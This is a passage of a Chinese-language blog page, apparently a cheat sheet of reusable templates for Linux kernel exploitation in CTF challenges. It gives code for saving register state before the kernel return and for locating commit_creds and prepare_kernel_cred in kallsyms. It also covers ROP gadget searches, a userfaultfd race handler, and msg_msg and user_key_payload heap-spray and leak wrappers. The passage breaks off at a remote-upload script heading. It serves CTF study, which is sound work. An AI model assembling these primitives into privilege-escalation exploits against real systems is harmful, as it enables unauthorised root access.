$tmp&quot; 0# That didn&#39;t work, so retry after decompression.try_decompress &#39;\037\213\010&#39; xy    gunziptry_decompress &#39;\3757zXZ\000&#39; abcde unxztry_decompress &#39;BZh&#39;          xy    bunzip2try_decompress &#39;\135\0\0\0&#39;   xxx   unlzmatry_decompress &#39;\211\114\132&#39; xy    &#39;lzop -d&#39;try_decompress &#39;\002!L\030&#39;   xxx   &#39;lz4 -d&#39;try_decompress &#39;(\265/\375&#39;   xxx   unzstd# Finally check for uncompressed images or objects:check_vmlinux $img# Bail out:echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</code></pre><p>此脚本有时会面临无法提取或者说提取出来没有符号表的情况</p><h2 id="2-vmlinux-to-elf"><a href="#2-vmlinux-to-elf" class="headerlink" title="2.vmlinux-to-elf"></a>2.vmlinux-to-elf</h2><p>较之于上面脚本完善一点，github地址如下：</p><p><a href="https://github.com/marin-m/vmlinux-to-elf">https://github.com/marin-m/vmlinux-to-elf</a></p><h2 id="3-保存现场"><a href="#3-保存现场" class="headerlink" title="3.保存现场"></a>3.保存现场</h2><p>该C代码主要用于在我们进入内核态前期来保存我们几个相应寄存器的值</p><pre><code class="hljs">size_t user_cs, user_ss,user_rflags,user_sp;//int fd = 0;        // file pointer of process &#39;core&#39;void saveStatus()&#123;  __asm__(&quot;mov user_cs, cs;&quot;          &quot;mov user_ss, ss;&quot;          &quot;mov user_sp, rsp;&quot;          &quot;pushf;&quot;          &quot;pop user_rflags;&quot;          );  puts(&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;);&#125;</code></pre><h2 id="4-查找符号地址"><a href="#4-查找符号地址" class="headerlink" title="4. 查找符号地址"></a>4. 查找符号地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">get_function_address</span><span class="hljs-params">()</span>&#123;<br>        FILE* sym_table = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);        <span class="hljs-comment">// including all address of kernel functions,just like the user model running address.</span><br>        <span class="hljs-keyword">if</span>(sym_table == <span class="hljs-literal">NULL</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-type">size_t</span> addr = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">char</span> func_name[<span class="hljs-number">0x50</span>];<br>        <span class="hljs-comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;<br>                <span class="hljs-keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)                <span class="hljs-comment">// two addresses of key functions are all found, return directly.</span><br>                        <span class="hljs-keyword">return</span>;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(func_name, <span class="hljs-string">&quot;commit_creds&quot;</span>))&#123;                <span class="hljs-comment">// function &quot;commit_creds&quot; found</span><br>                        commit_creds = addr;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(func_name, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))&#123;<br>                        prepare_kernel_cred = addr;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);<br>                &#125;<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-打印小妙招"><a href="#5-打印小妙招" class="headerlink" title="5. 打印小妙招"></a>5. 打印小妙招</h2><p>普通的打印早已无法满足我，给点花花绿绿的字体更加醒目一点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-寻找gadget或符号"><a href="#6-寻找gadget或符号" class="headerlink" title="6. 寻找gadget或符号"></a>6. 寻找gadget或符号</h2><p>利用以下两个命令，第一个可以用来查看反汇编内核程序，第二个可以方便我们利用grep来进行查找gadget</p><pre><code class="hljs">objdump -d -M intel ./vmlinux &gt; ./asmble&amp;&amp;ROPgadget --binary ./vmlinux &gt; ./gadget</code></pre><h2 id="7-cpu绑核"><a href="#7-cpu绑核" class="headerlink" title="7. cpu绑核"></a>7. cpu绑核</h2><p>在linux内核的分配器中，我们通常是位于多个cpu的情况之下，所以为了避免我们堆分配的失误，我们需要将我们的舞台定格在同一个cpu当中，所以我们需要添加下面的一段代码来限制我们的分配范围：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-userfaultfd"><a href="#8-userfaultfd" class="headerlink" title="8. userfaultfd"></a>8. userfaultfd</h2><p>使用它来修改一处指定地址的值，用到的板子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>         </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span>           </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span>         </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg) do&#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                    &#125; while(0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;   <span class="hljs-comment">/* the length of your data */</span><br> <br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* page; <span class="hljs-comment">/* the data you want to overwrite */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span> <span class="hljs-comment">/* data read from userfaultfd */</span><br>  <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>  <span class="hljs-type">long</span> uffd;        <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>  <span class="hljs-type">ssize_t</span> nread;<br><br>  uffd = (<span class="hljs-type">long</span>)arg;<br><br>  <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd file descriptor */</span><br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-type">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span>(nready == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>    <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br>    info_log(<span class="hljs-string">&quot;catch the user page fault!&quot;</span>);<br>    nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>    sleep(<span class="hljs-number">10000</span>);<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>    <span class="hljs-comment">/* We expect only one king of evenr; verify that assuption */</span><br>    <span class="hljs-keyword">if</span>(msg.event != UFFD_EVENT_PAGEFAULT)&#123;<br>      <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* copy things to the addr */</span><br><br>    uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>    <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">     * So, round faulting address down to page boundary */</span><br>    uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="hljs-number">1</span>);<br><br>    uffdio_copy.len = page_size;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>&#123;<br>  PRINT_ADDR(<span class="hljs-string">&quot;starting to monitor&quot;</span>, addr);<br>  <span class="hljs-type">long</span> uffd;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>  <span class="hljs-type">pthread_t</span> monitor_thread;<br>  <span class="hljs-type">int</span> s;<br><br>  <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>  <span class="hljs-keyword">if</span>(uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>  uffdio_api.api = UFFD_API;<br>  uffdio_api.features = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>  uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>  uffdio_register.range.len = len;<br>  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>  <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>  s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd);<br>  <br>  info_log(<span class="hljs-string">&quot;create thread...&quot;</span>);<br>  <span class="hljs-keyword">if</span>(s != <span class="hljs-number">0</span>)&#123;<br>    errno = s;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="9-kernel常用头文件"><a href="#9-kernel常用头文件" class="headerlink" title="9. kernel常用头文件"></a>9. kernel常用头文件</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="10-user-key-payload相关函数封装"><a href="#10-user-key-payload相关函数封装" class="headerlink" title="10.user_key_payload相关函数封装"></a>10.user_key_payload相关函数封装</h2><p>可被用做堆喷结构体和地址泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING-2<span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE2<span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE3<span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK9<span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ11<span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br><span class="hljs-keyword">return</span> syscall(_NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(_NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(_NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(_NR_keyctl, KEYCTL_READ, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;                                                                             <br>  <span class="hljs-keyword">return</span> syscall(_NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11-msg-msg利用相关函数封装"><a href="#11-msg-msg利用相关函数封装" class="headerlink" title="11.msg_msg利用相关函数封装"></a>11.msg_msg利用相关函数封装</h2><p>任意块分配，可进行越界读或利用条件竞争进行任意地址写，该结构体通常用来泄露地址且配合其他结构体进行利用,注意这里recv_msg时，头部的 <code>list_head-&gt;next,prev</code>指针为有效内核地址即可 :)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msg</span>&#123;<br>    <span class="hljs-type">void</span>* m_next;<br>    <span class="hljs-type">void</span>* m_prev;<br>    <span class="hljs-type">long</span> m_type;<br>    <span class="hljs-type">size_t</span> m_ts;<br>    <span class="hljs-type">size_t</span> next;<br>    <span class="hljs-type">size_t</span> security;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msgseg</span>&#123;<br>    <span class="hljs-type">size_t</span> *next;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">get_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">msgget</span>(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgflg)</span></span>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgflg;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">msgsnd</span>(msqid, msgp, msgsz - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">msgrcv</span>(msqid, msgp, msgsz - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">copy_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">msgrcv</span>(msqid, msgp, msgsz - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12-内核base64打远程脚本"><a href="#12-内核base64打远程脚本" class="headerlink" title="12.内核base64打远程脚本"></a>12.内核base64打远程脚本</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td 